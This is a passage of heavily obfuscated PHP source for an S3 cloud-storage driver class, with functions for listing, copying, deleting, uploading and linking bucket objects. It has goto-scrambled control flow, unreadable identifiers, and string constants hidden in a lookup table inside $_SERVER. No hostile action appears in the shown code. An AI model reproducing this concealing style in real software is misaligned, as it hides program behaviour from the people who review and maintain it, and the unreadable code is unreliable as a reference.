aÀùÔ‘Ú«: } public function listAllFiles($FÚ©ÂË‹≥Æ, $AÑˆËÔ·≠…, $Cµ‰û¶∞°ç = array()) { goto fø˘Úü±è; fø˘Úü±è: $D´“ñ∑à∫ª =& $_SERVER[™⁄»üÆ]; if (empty($AÑˆËÔ·≠…)) { return array(); } $dÏË«˘πÿ˘ = array(); goto a„∑Ôûêæ; a„∑Ôûêæ: $FÚ©ÂË‹≥Æ = trim($FÚ©ÂË‹≥Æ, $D´“ñ∑à∫ª[8]); foreach ($AÑˆËÔ·≠… as $B∫äΩ¡«≤î) { $AÀæﬂØôπ∞ = ltrim(substr(trim($B∫äΩ¡«≤î, $D´“ñ∑à∫ª[8]), strlen($FÚ©ÂË‹≥Æ)), $D´“ñ∑à∫ª[8]); $dÏË«˘πÿ˘ = array_merge($dÏË«˘πÿ˘, $this->slicePath($AÀæﬂØôπ∞)); } $AÚÉöÏ¬∫∫ = array(); goto e«˜ÔÉ≤∏ä; e«˜ÔÉ≤∏ä: foreach (array_unique($dÏË«˘πÿ˘) as $B∫äΩ¡«≤î) { $eá´Û∑∫ Ø = array($D´“ñ∑à∫ª[76] => $this->getPathOuter($D´“ñ∑à∫ª[8] . $FÚ©ÂË‹≥Æ . $D´“ñ∑à∫ª[8] . $B∫äΩ¡«≤î), $D´“ñ∑à∫ª[77] => 1, $D´“ñ∑à∫ª[78] => 0); if (substr($B∫äΩ¡«≤î, -1) != $D´“ñ∑à∫ª[8]) { $eá´Û∑∫ Ø[$D´“ñ∑à∫ª[77]] = 0; $CÜñÍÖÚ√È = $this->getPath($FÚ©ÂË‹≥Æ . $D´“ñ∑à∫ª[8] . $B∫äΩ¡«≤î); $eá´Û∑∫ Ø[$D´“ñ∑à∫ª[78]] = isset($Cµ‰û¶∞°ç[$CÜñÍÖÚ√È]) ? $Cµ‰û¶∞°ç[$CÜñÍÖÚ√È] : $this->size($CÜñÍÖÚ√È); } $AÚÉöÏ¬∫∫[] = $eá´Û∑∫ Ø; } return $AÚÉöÏ¬∫∫; goto f···ù√ñ≈; f···ù√ñ≈: } public function slicePath($E£‘™É≤ö©) { $Dˆıò¯∑£á =& $_SERVER[™⁄»üÆ]; $FıùÔΩ©¢õ = explode($Dˆıò¯∑£á[8], trim($E£‘™É≤ö©, $Dˆıò¯∑£á[8])); $Cœπ¬ò€Óä = 0; do { ++$Cœπ¬ò€Óä; $f‹≤ñûÇÉÉ[] = implode($Dˆıò¯∑£á[8], array_slice($FıùÔΩ©¢õ, 0, $Cœπ¬ò€Óä)) . $Dˆıò¯∑£á[8]; } while ($Cœπ¬ò€Óä < count($FıùÔΩ©¢õ)); $f‹≤ñûÇÉÉ[count($FıùÔΩ©¢õ) - 1] = $E£‘™É≤ö©; return $f‹≤ñûÇÉÉ; } public function getHost() { $aÏÖ´Í∂á› =& $_SERVER[™⁄»üÆ]; $CîÙÉ·• ⁄ = parse_url(trim($this->domain, $aÏÖ´Í∂á›[8])); $a£§íâñÌß = isset($CîÙÉ·• ⁄[$aÏÖ´Í∂á›[174]]) ? $CîÙÉ·• ⁄[$aÏÖ´Í∂á›[174]] : http_type(); $BãÚ•…‚…« = isset($CîÙÉ·• ⁄[$aÏÖ´Í∂á›[175]]) ? $CîÙÉ·• ⁄[$aÏÖ´Í∂á›[175]] : $CîÙÉ·• ⁄[$aÏÖ´Í∂á›[76]]; if (isset($CîÙÉ·• ⁄[$aÏÖ´Í∂á›[176]])) { $BãÚ•…‚…« .= $aÏÖ´Í∂á›[4] . $CîÙÉ·• ⁄[$aÏÖ´Í∂á›[176]]; } return $a£§íâñÌß . $aÏÖ´Í∂á›[177] . $BãÚ•…‚…«; } public function pathEncode($F˘âª—£ø´) { $c¡ÖªçÍâÑ =& $_SERVER[™⁄»üÆ]; return str_replace($c¡ÖªçÍâÑ[178], $c¡ÖªçÍâÑ[8], rawurlencode($F˘âª—£ø´)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\x34"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public function __construct($a—Ô§ª¨‹ù) { set_timeout(); require_once SDK_DIR . $_SERVER[™⁄»üÆ][179]; parent::__construct(); $this->_init($a—Ô§ª¨‹ù); } public function _init($A⁄æÚ´Ω–Õ) { foreach ($A⁄æÚ´Ω–Õ as $fçÇ⁄Ω˜à∂ => $F‰ÊÌì√°«) { if (isset($this->{$fçÇ⁄Ω˜à∂})) { $this->{$fçÇ⁄Ω˜à∂} = $F‰ÊÌì√°«; } } $this->endpoint = $A⁄æÚ´Ω–Õ[$_SERVER[™⁄»üÆ][180]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($Fπâ°≤Ú∆µ = "\x76\64") { $this->signVer = $Fπâ°≤Ú∆µ; $this->client->setSignatureVersion($Fπâ°≤Ú∆µ); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { goto c„Ó†—¿ê∞; bŸ„Õ™õ¥„: if ($F“ä°Êâé™[$F∞øò‹†÷ã[181]] != $F∞øò‹†÷ã[182] || $F“ä°Êâé™[$F∞øò‹†÷ã[183]] != $F∞øò‹†÷ã[182]) { return !1; } $dåØÉﬂ≈◊π = array_map($F∞øò‹†÷ã[184], $F“ä°Êâé™[$F∞øò‹†÷ã[185]]); if (!is_array($dåØÉﬂ≈◊π)) { $dåØÉﬂ≈◊π = array(); } goto EÓˆ¿Éˆ‹É; EÓˆ¿Éˆ‹É: $e‡∆”ﬂ¡éÚ = array($F∞øò‹†÷ã[186], $F∞øò‹†÷ã[187], $F∞øò‹†÷ã[188], $F∞øò‹†÷ã[189], $F∞øò‹†÷ã[190]); $F®”Üœπ¬∞ = array_diff($e‡∆”ﬂ¡éÚ, $dåØÉﬂ≈◊π); return empty($F®”Üœπ¬∞); goto Eâ°¯≈Â«Ñ; c„Ó†—¿ê∞: $F∞øò‹†÷ã =& $_SERVER[™⁄»üÆ]; $F“ä°Êâé™ = $this->getBucketCors(); if (!$F“ä°Êâé™ || !is_array($F“ä°Êâé™)) { return !1; } goto bŸ„Õ™õ¥„; Eâ°¯≈Â«Ñ: } public function mkfile($aÕüÃÇΩ§Æ, $aÒÂìâÿäò = '', $eÁ™Ö¬åÏ = REPEAT_RENAME) { $eñË≤ÍÇªå = $this->setContent($aÕüÃÇΩ§Æ, $aÒÂìâÿäò); if ($eñË≤ÍÇªå !== !1) { return $this->getPathOuter($aÕüÃÇΩ§Æ); } return !1; } public function mkdir($dﬁåÒ∏ó÷à, $b¿Œ•‚Ÿ»∞ = REPEAT_SKIP) { $A∫ûÎÊ ©ñ =& $_SERVER[™⁄»üÆ]; if (empty($dﬁåÒ∏ó÷à) && $dﬁåÒ∏ó÷à !== $A∫ûÎÊ ©ñ[191]) { return !1; } if ($this->_isFolder($dﬁåÒ∏ó÷à)) { return $this->getPathOuter($dﬁåÒ∏ó÷à); } $D±êÛîê•Â = $this->setContent($dﬁåÒ∏ó÷à, $A∫ûÎÊ ©ñ[33], !0); if ($D±êÛîê•Â !== !1) { return $this->getPathOuter($dﬁåÒ∏ó÷à); } return !1; } public function copyFile($aø…èÇ€Ûˆ, $dÆç ÕÈ…Ö, $C¬‚Ö÷àãè = array()) { $d‹¯∞∂â‘ =& $_SERVER[™⁄»üÆ]; $fâ›·†Ñ˜É = $this->objectMeta($aø…èÇ€Ûˆ); if (!$fâ›·†Ñ˜É) { return !1; } if ($fâ›·†Ñ˜É[$d‹¯∞∂â‘[78]] <= 1024 * 1024 * 200) { $bûª¿ßÊºç = $this->client->copyObject($this->bucket, $aø…èÇ€Ûˆ, $this->bucket, $dÆç ÕÈ…Ö, $d‹¯∞∂â‘[192], $C¬‚Ö÷àãè); } else { $bûª¿ßÊºç = $this->client->multiCopyObject($this->bucket, $aø…èÇ€Ûˆ, $this->bucket, $dÆç ÕÈ…Ö, $C¬‚Ö÷àãè); } $bûª¿ßÊºç = $bûª¿ßÊºç ? $this->getPathOuter($dÆç ÕÈ…Ö) : !1; return $bûª¿ßÊºç; } public function moveFile($D°§®†ø´, $Fµ⁄Ç‘≥ºÎ) { if ($this->copyFile($D°§®†ø´, $Fµ⁄Ç‘≥ºÎ)) { $this->delFile($D°§®†ø´); return $this->getPathOuter($Fµ⁄Ç‘≥ºÎ); } return !1; } public function delFile($D›ﬁ†É±Æá) { return $this->client->deleteObject($this->bucket, $D›ﬁ†É±Æá); } public function delFolder($f∏“√ÕÁêí) { goto fπËïê∏∂›; d√£ÚòÖ∫é: $eÌπö‘€… = $this->fileList($f∏“√ÕÁêí); $this->listItemCache = !0; $Dä≠°“≈Ûœ = trim($f∏“√ÕÁêí, $B√¢≥è§’«[8]) . $B√¢≥è§’«[8]; goto cÑ®˘·Ëéõ; f´ê¡ä¿ôÌ: $d≥£ÒÛ©’‹ = $this->delByBatch($eÌπö‘€…[$B√¢≥è§’«[75]]); if (!$d≥£ÒÛ©’‹) { return !1; } return $this->delFile($Dä≠°“≈Ûœ); goto AË˜à‹ÙΩ‡; fπËïê∏∂›: $B√¢≥è§’« =& $_SERVER[™⁄»üÆ]; if (!$this->exist($f∏“√ÕÁêí)) { return !0; } $this->listItemCache = !1; goto d√£ÚòÖ∫é; cÑ®˘·Ëéõ: if (!empty($f∏“√ÕÁêí) && $f∏“√ÕÁêí !== $B√¢≥è§’«[191] && !in_array($Dä≠°“≈Ûœ, $eÌπö‘€…[$B√¢≥è§’«[75]])) { $eÌπö‘€…[$B√¢≥è§’«[75]][] = $Dä≠°“≈Ûœ; } $d≥£ÒÛ©’‹ = $this->delByBatch($eÌπö‘€…[$B√¢≥è§’«[74]]); if (!$d≥£ÒÛ©’‹) { return !1; } goto f´ê¡ä¿ôÌ; AË˜à‹ÙΩ‡: } private function delByBatch($c’ÂÒ¢◊ı≈) { foreach (array_chunk($c’ÂÒ¢◊ı≈, 1000) as $AÊàõ∆ÎÈË) { $Aú ˘àÔ‡∏ = $this->client->deleteObjects($this->bucket, $AÊàõ∆ÎÈË); if (!$Aú ˘àÔ‡∏) { return !1; } } return !0; } public function rename($aàÓ≥—„ , $CÒéù˘Çµ) { return $this->renameObject($aàÓ≥—„ , $CÒéù˘Çµ); } public function listPath($BıêèèÜ†ô, $AœØØ≤ÇóΩ = false) { $A´Î‡á™πÈ =& $_SERVER[™⁄»üÆ]; $d±◊°‚Èà» = $this->fileList($BıêèèÜ†ô, $A´Î‡á™πÈ[8], !0); foreach ($d±◊°‚Èà»[$A´Î‡á™πÈ[75]] as $b‡Í¢…ƒß® => $dÆÙºÂ∆±™) { $d±◊°‚Èà»[$A´Î‡á™πÈ[75]][$b‡Í¢…ƒß®] = $this->folderInfo($dÆÙºÂ∆±™, $AœØØ≤ÇóΩ); } foreach ($d±◊°‚Èà»[$A´Î‡á™πÈ[74]] as $b‡Í¢…ƒß® => $dÆÙºÂ∆±™) { $d±◊°‚Èà»[$A´Î‡á™πÈ[74]][$b‡Í¢…ƒß®] = $this->fileInfo($dÆÙºÂ∆±™[$A´Î‡á™πÈ[28]], $AœØØ≤ÇóΩ, $dÆÙºÂ∆±™); } return $d±◊°‚Èà»; } private function fileInfo($b€ÍÃå˜õå, $EÒôÙ∏Ïº≤ = false, $eüè∂÷“√‡ = array()) { goto bïÃËëÁŒÁ; aåõë—·ö: if (isset($eüè∂÷“√‡[$A˜ç≠ƒÿ Ú[197]])) { $f¢∆£ìá’≥[$A˜ç≠ƒÿ Ú[84]] = $eüè∂÷“√‡[$A˜ç≠ƒÿ Ú[197]]; } if (isset($eüè∂÷“√‡[$A˜ç≠ƒÿ Ú[78]])) { $f¢∆£ìá’≥[$A˜ç≠ƒÿ Ú[78]] = $eüè∂÷“√‡[$A˜ç≠ƒÿ Ú[78]]; } return $f¢∆£ìá’≥; goto aï∫ä€Ñ¡î; eËπ—‰äß∫: $f¢∆£ìá’≥[$A˜ç≠ƒÿ Ú[194]] = $f¢∆£ìá’≥[$A˜ç≠ƒÿ Ú[84]] = 0; $f¢∆£ìá’≥[$A˜ç≠ƒÿ Ú[195]] = $f¢∆£ìá’≥[$A˜ç≠ƒÿ Ú[196]] = !0; if (empty($eüè∂÷“√‡)) { $eüè∂÷“√‡ = $this->objectMeta($b€ÍÃå˜õå); if (!$eüè∂÷“√‡) { return $f¢∆£ìá’≥; } } goto aåõë—·ö; bïÃËëÁŒÁ: $A˜ç≠ƒÿ Ú =& $_SERVER[™⁄»üÆ]; $f¢∆£ìá’≥ = array($A˜ç≠ƒÿ Ú[28] => $this->pathThis($b€ÍÃå˜õå), $A˜ç≠ƒÿ Ú[76] => $this->getPathOuter($b€ÍÃå˜õå), $A˜ç≠ƒÿ Ú[29] => $A˜ç≠ƒÿ Ú[193], $A˜ç≠ƒÿ Ú[168] => $this->ext($b€ÍÃå˜õå), $A˜ç≠ƒÿ Ú[78] => isset($eüè∂÷“√‡[$A˜ç≠ƒÿ Ú[78]]) ? $eüè∂÷“√‡[$A˜ç≠ƒÿ Ú[78]] : 0); if ($EÒôÙ∏Ïº≤) { return $f¢∆£ìá’≥; } goto eËπ—‰äß∫; aï∫ä€Ñ¡î: } private function folderInfo($e““úåŒä∂, $Añíüã–çπ = false) { goto cÂË¡Œ¨¬¬; Fò‰à‚ìÒ∫: $CàÛí†ùÒΩ[$E≤äÖò∂ﬂé[194]] = $CàÛí†ùÒΩ[$E≤äÖò∂ﬂé[84]] = 0; $CàÛí†ùÒΩ[$E≤äÖò∂ﬂé[195]] = $CàÛí†ùÒΩ[$E≤äÖò∂ﬂé[196]] = !0; if ($e““úåŒä∂ == $E≤äÖò∂ﬂé[33]) { return $CàÛí†ùÒΩ; } goto c°√ßºäœ‹; cÂË¡Œ¨¬¬: $E≤äÖò∂ﬂé =& $_SERVER[™⁄»üÆ]; $CàÛí†ùÒΩ = array($E≤äÖò∂ﬂé[28] => $this->pathThis($e““úåŒä∂), $E≤äÖò∂ﬂé[76] => $this->getPathOuter($E≤äÖò∂ﬂé[8] . $e““úåŒä∂), $E≤äÖò∂ﬂé[29] => $E≤äÖò∂ﬂé[77]); if ($Añíüã–çπ) { return $CàÛí†ùÒΩ; } goto Fò‰à‚ìÒ∫; c°√ßºäœ‹: $e““úåŒä∂ = trim($e““úåŒä∂, $E≤äÖò∂ﬂé[8]) . $E≤äÖò∂ﬂé[8]; $B°©ûâ§áÊ = $this->objectMeta($e““úåŒä∂); if (isset($B°©ûâ§áÊ[$E≤äÖò∂ﬂé[197]])) { $CàÛí†ùÒΩ[$E≤äÖò∂ﬂé[194]] = $B°©ûâ§áÊ[$E≤äÖò∂ﬂé[197]]; } goto b»≥¡ÖÁÎı; b»≥¡ÖÁÎı: return $CàÛí†ùÒΩ; goto E‰∂€›ñ∏ã; E‰∂€›ñ∏ã: } private function fileList($D‡≈∏¿àé∆, $d´‘ú–∫éı = '', $CÉ¯ÏÓ≥îò = 0) { goto dºœÇ”®©Û; Fœ–œ∞∂çî: if (!$CòõÿÖââ¯) { return array($cπÑ›ùËòÑ[75] => array(), $cπÑ›ùËòÑ[74] => array()); } $aõﬂ∏Õì¡ƒ = $this->listItemCache === !1 ? !1 : !0; $bÖÖ¢¬òƒ∆ = $EÿêÜÈÕâ¨ = array(); goto d∏ÏÌßœâœ; d∏ÏÌßœâœ: foreach ($CòõÿÖââ¯[$cπÑ›ùËòÑ[198]] as $cèœï‘áﬁØ) { goto FŒöÚ’Ó∆‘; D‹¯èˆÿ„†: $EÿêÜÈÕâ¨[] = $CÉ¯ÏÓ≥îò ? $cèœï‘áﬁØ : $eÂìæËæ•§; goto bÃÛ˘àñœ‰; Aá∏…„ÍÍ≥: $FÒ◊òıáÈê = $eßá∫ƒíﬂõ == 0 && substr($eÂìæËæ•§, strlen($eÂìæËæ•§) - 1, 1) == $cπÑ›ùËòÑ[8] ? !0 : !1; if ($aõﬂ∏Õì¡ƒ) { $this->cacheMethod($cπÑ›ùËòÑ[199], $eÂìæËæ•§, $FÒ◊òıáÈê); $this->cacheMethod($cπÑ›ùËòÑ[200], $eÂìæËæ•§, $cèœï‘áﬁØ); } if ($FÒ◊òıáÈê) { $bÖÖ¢¬òƒ∆[] = $eÂìæËæ•§; continue; } goto D‹¯èˆÿ„†; FŒöÚ’Ó∆‘: $eÂìæËæ•§ = $cèœï‘áﬁØ[$cπÑ›ùËòÑ[28]]; if ($eÂìæËæ•§ == $B∆ö∫ﬁ£Î›) { continue; } $eßá∫ƒíﬂõ = isset($cèœï‘áﬁØ[$cπÑ›ùËòÑ[78]]) ? $cèœï‘áﬁØ[$cπÑ›ùËòÑ[78]] : 0; goto Aá∏…„ÍÍ≥; bÃÛ˘àñœ‰: } foreach ($CòõÿÖââ¯[$cπÑ›ùËòÑ[201]] as $cèœï‘áﬁØ) { $bÖÖ¢¬òƒ∆[] = $cèœï‘áﬁØ[$cπÑ›ùËòÑ[28]]; if ($aõﬂ∏Õì¡ƒ) { $this->cacheMethod($cπÑ›ùËòÑ[199], $cèœï‘áﬁØ[$cπÑ›ùËòÑ[28]], !0); } } if ($aõﬂ∏Õì¡ƒ) { $this->cacheMethod($cπÑ›ùËòÑ[199], $D‡≈∏¿àé∆, !0); } goto dëåÙ„åæ; dºœÇ”®©Û: $cπÑ›ùËòÑ =& $_SERVER[™⁄»üÆ]; $B∆ö∫ﬁ£Î› = rtrim($D‡≈∏¿àé∆, $cπÑ›ùËòÑ[8]) . $cπÑ›ùËòÑ[8]; $CòõÿÖââ¯ = $this->listObjs($B∆ö∫ﬁ£Î›, null, null, $d´‘ú–∫éı); goto Fœ–œ∞∂çî; dëåÙ„åæ: return array($cπÑ›ùËòÑ[75] => $bÖÖ¢¬òƒ∆, $cπÑ›ùËòÑ[74] => $EÿêÜÈÕâ¨); goto CØá¢∆œóÜ; CØá¢∆œóÜ: } private function listObjs($Dˆ°¥åµûã, $bëí™ﬁ±’Æ = null, $Aç˜≥”√ıù = null, $bâóÖ£ìÔ⁄ = null) { $e©•ŒÕÌúœ =& $_SERVER[™⁄»üÆ]; $Dˆ°¥åµûã = trim($Dˆ°¥åµûã, $e©•ŒÕÌúœ[8]); $E© Ú„âÒ¡ = empty($Dˆ°¥åµûã) && $Dˆ°¥åµûã !== $e©•ŒÕÌúœ[191] ? $e©•ŒÕÌúœ[33] : $Dˆ°¥åµûã . $e©•ŒÕÌúœ[8]; return $this->client->getBucket($this->bucket, $E© Ú„âÒ¡, $bëí™ﬁ±’Æ, $Aç˜≥”√ıù, $bâóÖ£ìÔ⁄, !0); } public function has($B◊œÔÛ÷ı¢, $EùÔ‡ËƒÛó = false, $E¿•”ˆìÉä = true) { goto dîÊ‹√Ü•ò; cÖÏ±•∏ÆΩ: $fŸéå∂Ó®Ò = null; $DÁèé¿∂™π = 500; $cù“æÜÇ®Ñ = $C›∏¡ÓÌ»Û[8]; goto FÛìøÚã«Ü; dîÊ‹√Ü•ò: $C›∏¡ÓÌ»Û =& $_SERVER[™⁄»üÆ]; $B◊œÔÛ÷ı¢ = trim($B◊œÔÛ÷ı¢, $C›∏¡ÓÌ»Û[8]); $A±ëÇÁâöó = empty($B◊œÔÛ÷ı¢) && $B◊œÔÛ÷ı¢ !== $C›∏¡ÓÌ»Û[191] ? $C›∏¡ÓÌ»Û[33] : $B◊œÔÛ÷ı¢ . $C›∏¡ÓÌ»Û[8]; goto cÖÏ±•∏ÆΩ; FÛìøÚã«Ü: $B˜ÈÙä≤£Ü = $cõ§€ˆê≤– = array(); while (!0) { $Aπèµ´íá° = $this->listObjs($B◊œÔÛ÷ı¢, $fŸéå∂Ó®Ò, $DÁèé¿∂™π, $cù“æÜÇ®Ñ); if (!$Aπèµ´íá°) { break; } $fŸéå∂Ó®Ò = $Aπèµ´íá°[$C›∏¡ÓÌ»Û[202]]; $f–ÓÔå∆∆∆ = $Aπèµ´íá°[$C›∏¡ÓÌ»Û[198]]; $E©˜áç„≠› = $Aπèµ´íá°[$C›∏¡ÓÌ»Û[201]]; if (empty($f–ÓÔå∆∆∆) && empty($E©˜áç„≠›)) { break; } if (count($f–ÓÔå∆∆∆) == 1 && $f–ÓÔå∆∆∆[0][$C›∏¡ÓÌ»Û[28]] == $A±ëÇÁâöó) { break; } if ($EùÔ‡ËƒÛó) { if (count($f–ÓÔå∆∆∆)) { $f–ÓÔå∆∆∆ = array_column($f–ÓÔå∆∆∆, $C›∏¡ÓÌ»Û[28]); $B˜ÈÙä≤£Ü = array_merge($B˜ÈÙä≤£Ü, $f–ÓÔå∆∆∆); } if (count($E©˜áç„≠›)) { $E©˜áç„≠› = array_column($E©˜áç„≠›, $C›∏¡ÓÌ»Û[28]); $cõ§€ˆê≤– = array_merge($cõ§€ˆê≤–, $E©˜áç„≠›); } if ($fŸéå∂Ó®Ò === null) { break; } continue; } if ($E¿•”ˆìÉä) { if (!empty($f–ÓÔå∆∆∆)) { if (count($f–ÓÔå∆∆∆) > 1 || isset($f–ÓÔå∆∆∆[0][$C›∏¡ÓÌ»Û[28]]) && $f–ÓÔå∆∆∆[0][$C›∏¡ÓÌ»Û[28]] != $A±ëÇÁâöó) { return !0; } } } else { if (!empty($E©˜áç„≠›)) { return !0; } } if ($fŸéå∂Ó®Ò === null) { break; } } if ($EùÔ‡ËƒÛó) { $B˜ÈÙä≤£Ü = array_diff($B˜ÈÙä≤£Ü, array($A±ëÇÁâöó)); $B˜ÈÙä≤£Ü = count(array_unique($B˜ÈÙä≤£Ü)); $cõ§€ˆê≤– = count(array_unique($cõ§€ˆê≤–)); return array($C›∏¡ÓÌ»Û[203] => $B˜ÈÙä≤£Ü, $C›∏¡ÓÌ»Û[204] => $cõ§€ˆê≤–); } goto c®Ñºìî∏·; c®Ñºìî∏·: return !1; goto bù€§◊Ñ†ò; bù€§◊Ñ†ò: } public function listAll($aàÒÉﬂÒê∑) { $dÑØ¢ÒËÈÇ =& $_SERVER[™⁄»üÆ]; $eÔÆ±‰ﬂ»Ñ = $this->fileList($aàÒÉﬂÒê∑, $dÑØ¢ÒËÈÇ[33], !0); $Bä™û œÊ¥ = array(); foreach ($eÔÆ±‰ﬂ»Ñ[$dÑØ¢ÒËÈÇ[74]] as $bàÛ„≥ˆó”) { $Bä™û œÊ¥[$bàÛ„≥ˆó”[$dÑØ¢ÒËÈÇ[28]]] = $bàÛ„≥ˆó”[$dÑØ¢ÒËÈÇ[78]]; } foreach ($eÔÆ±‰ﬂ»Ñ[$dÑØ¢ÒËÈÇ[75]] as $bàÛ„≥ˆó”) { if (is_string($bàÛ„≥ˆó”)) { $Bä™û œÊ¥[$bàÛ„≥ˆó”] = 0; } } return $this->listAllFiles($aàÒÉﬂÒê∑, array_keys($Bä™û œÊ¥), $Bä™û œÊ¥); } public function canRead($E£±çÇ©Áä) { $f¥•™òÂ◊å =& $_SERVER[™⁄»üÆ]; $d»œõèˆºç = $this->client->getAccessControlPolicy($this->bucket, $E£±çÇ©Áä); if (!$d»œõèˆºç) { return !1; } return in_array($d»œõèˆºç, array($f¥•™òÂ◊å[205], $f¥•™òÂ◊å[206], $f¥•™òÂ◊å[207])) ? !0 : !1; } public function canWrite($Eˆ¯∆«È«¿) { $f◊±£è¯ÈÈ =& $_SERVER[™⁄»üÆ]; $D°Ú±ÆÉîá = $this->client->getAccessControlPolicy($this->bucket, $Eˆ¯∆«È«¿); if (!$D°Ú±ÆÉîá) { return !1; } return in_array($D°Ú±ÆÉîá, array($f◊±£è¯ÈÈ[205], $f◊±£è¯ÈÈ[206])) ? !0 : !1; } public function getContent($E°ó€åŒ—) { return $this->client->getObject($this->bucket, $E°ó€åŒ—); } public function setContent($f Æñ°¬¬«, $fí™Ì¨ÊÃ = '', $a˜ô≤˘¥©• = false) { goto fÈ∏∫âî·ó; eäáßÜ«ÁÖ: $C∏ªñºëª = $this->client->putObject($fí™Ì¨ÊÃ, $this->bucket, $f Æñ°¬¬«, $b©ˆî¡±ãá[192], array(), $F‰‰â·ñ™˘); if (!$C∏ªñºëª) { return !1; } if ($a˜ô≤˘¥©•) { return !0; } goto EÃ«“»–∫ú; fÈ∏∫âî·ó: $b©ˆî¡±ãá =& $_SERVER[™⁄»üÆ]; $f Æñ°¬¬« = $a˜ô≤˘¥©• ? trim($f Æñ°¬¬«, $b©ˆî¡±ãá[8]) . $b©ˆî¡±ãá[8] : $f Æñ°¬¬«; $F‰‰â·ñ™˘ = get_file_mime(get_path_ext($f Æñ°¬¬«)); goto eäáßÜ«ÁÖ; EÃ«“»–∫ú: $this->cacheMethod(null, null); $C∏ªñºëª = $this->copyFile($f Æñ°¬¬«, $f Æñ°¬¬«, array($b©ˆî¡±ãá[208] => $C∏ªñºëª[$b©ˆî¡±ãá[209]])); return $C∏ªñºëª ? !0 : !1; goto eõòÎ„≥’ë; eõòÎ„≥’ë: } public function fileSubstr($DñõÆ«¿ÁÜ, $Fù”‡—¶∂¯, $DÈ∞ ¶«ø†) { $C›Êûã“‚Ω = $Fù”‡—¶∂¯ + $DÈ∞ ¶«ø† - 1; return $this->client->getObject($this->bucket, $DñõÆ«¿ÁÜ, array($_SERVER[™⁄»üÆ][210] => "\x62\171\x74\145\163\75{$Fù”‡—¶∂¯}\x2d{$C›Êûã“‚Ω}")); } public function upload($fŸ∞‹ÿå¡ı, $EÈï¥ÁŸÿü, $Dö÷Ÿ⁄ÕîÓ = false, $F◊âÏ·ÁƒÖ = REPEAT_REPLACE) { $FÕ›◊¥é…≤ =& $_SERVER[™⁄»üÆ]; $fÿçˆÆπ… = array($FÕ›◊¥é…≤[208] => @md5_file($EÈï¥ÁŸÿü)); $a¿úèÚè§» = array($FÕ›◊¥é…≤[211] => get_file_mime(get_path_ext($fŸ∞‹ÿå¡ı))); if (IO::size($EÈï¥ÁŸÿü) <= 1024 * 1024 * 200) { $bùÛÍ≤µœ≠ = $this->client->putObjectFile($EÈï¥ÁŸÿü, $this->bucket, $fŸ∞‹ÿå¡ı, $FÕ›◊¥é…≤[192], $fÿçˆÆπ…, $a¿úèÚè§»); return !empty($bùÛÍ≤µœ≠) ? $this->getPathOuter($fŸ∞‹ÿå¡ı) : !1; } $Eœ¡åÊÿŒπ = $this->client->multiUploadObject($EÈï¥ÁŸÿü, $this->bucket, trim($fŸ∞‹ÿå¡ı, $FÕ›◊¥é…≤[8]), $fÿçˆÆπ…, $a¿úèÚè§»); return $Eœ¡åÊÿŒπ ? $this->getPathOuter($fŸ∞‹ÿå¡ı) : !1; } public function download($eï®Ù»°úè, $E‚ôéßˆ≠ﬂ) { if (!@is_dir($this->pathFather($E‚ôéßˆ≠ﬂ)) && !IO::mkdir($this->pathFather($E‚ôéßˆ≠ﬂ))) { return !1; } $c’·©¶öÂ = $this->client->getObject($this->bucket, $eï®Ù»°úè, array(), $E‚ôéßˆ≠ﬂ); return $c’·©¶öÂ !== !1 ? $E‚ôéßˆ≠ﬂ : !1; } public function link($dëº•ıæÖÙ, $AëÆÉœ•Öê = array()) { $b∏òò∆íè± =& $_SERVER[™⁄»üÆ]; if ($this->signVer == $b∏òò∆íè±[212]) { return $this->client->getAuthenticatedURL($this->bucket, $dëº•ıæÖÙ, 3600 * 12, $AëÆÉœ•Öê); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($dëº•ıæÖÙ, $b∏òò∆íè±[8]), 3600 * 12, $this->region, array(), !0, $AëÆÉœ•Öê); } public function fileOut($Eõ∑ˆ›»∂Õ, $cÛ÷¬√÷≠˜ = false, $D¢á´∫˜’À = false, $cï–ÜñÙòÇ = '') { goto BåﬁÇàèÛß; cù≈•∑Ëáé: $BÙù∫ãô”ç = array($b≈…àîÁ„Î[216] => $cÛ÷¬√÷≠˜ . $b≈…àîÁ„Î[217] . rawurlencode($D¢á´∫˜’À), $b≈…àîÁ„Î[218] => $aƒ‚Ÿ÷ﬂëƒ); $Eù∆¬¥’ Î = $this->link($Eõ∑ˆ›»∂Õ, $BÙù∫ãô”ç); $this->fileOutLink($Eù∆¬¥’ Î); goto eëóÕ™≈∑Ü; CêÚﬂ———Ï: $aƒ‚Ÿ÷ﬂëƒ = get_file_mime(get_path_ext($D¢á´∫˜’À)); if ($aƒ‚Ÿ÷ﬂëƒ == $b≈…àîÁ„Î[213]) { return parent::fileOut($Eõ∑ˆ›»∂Õ, $cÛ÷¬√÷≠˜, $D¢á´∫˜’À, $cï–ÜñÙòÇ); } $cÛ÷¬√÷≠˜ = $cÛ÷¬√÷≠˜ ? $b≈…àîÁ„Î[214] : $b≈…àîÁ„Î[215]; goto cù≈•∑Ëáé; BåﬁÇàèÛß: $b≈…àîÁ„Î =& $_SERVER[™⁄»üÆ]; if ($this->isFileOutServer()) { return $this->fileOutServer($Eõ∑ˆ›»∂Õ, $cÛ÷¬√÷≠˜, $D¢á´∫˜’À, $cï–ÜñÙòÇ); } if (!$D¢á´∫˜’À) { $D¢á´∫˜’À = $this->pathThis($Eõ∑ˆ›»∂Õ); } goto CêÚﬂ———Ï; eëóÕ™≈∑Ü: } public function fileOutServer($b˘äûÊ‹Ó‘, $C¥Ò ﬂ≠âı = false, $F÷Â«É›ÛÜ = false, $Dá‚ã¯¯º∆ = '') { parent::fileOut($b˘äûÊ‹Ó‘, $C¥Ò ﬂ≠âı, $F÷Â«É›ÛÜ, $Dá‚ã¯¯º∆); } public function fileOutImageServer($a∑Ê∑ë‚È≠, $EÙÇ÷äÑÇÇ = 250) { parent::fileOutImage($a∑Ê∑ë‚È≠, $EÙÇ÷äÑÇÇ); } public function hashMd5($eƒ“∞À’œ∑, $föÇÈ∏Ãˆ√ = '') { 